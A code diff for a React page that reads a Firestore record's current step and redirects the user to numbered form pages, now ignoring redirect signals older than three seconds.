@@ -63,18 +63,28 @@ export default function CheckPage() {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
           const step = data.currentStep
+          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
+          const now = Date.now()
 
           // Redirect based on currentStep
-          if (step === "home") {
-            router.push("/insur")
-          } else if (step === "phone") {
-            router.push("/step5")
-          } else if (step === "_t6") {
-            router.push("/step4")
-          } else if (step === "_t2") {
-            router.push("/step2")
-          } else if (step === "_t3") {
-            router.push("/step3")
+          if (step && step !== "_st1" && step !== "check") {
+            // Check if this is a NEW redirect (within 3 seconds)
+            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
+              console.log('[check] Stale currentStep redirect, ignoring')
+              return
+            }
+            
+            if (step === "home") {
+              router.push("/insur")
+            } else if (step === "phone") {
+              router.push("/step5")
+            } else if (step === "_t6") {
+              router.push("/step4")
+            } else if (step === "_t2") {
+              router.push("/step2")
+            } else if (step === "_t3") {
+              router.push("/step3")
+            }
           }
         }
       },
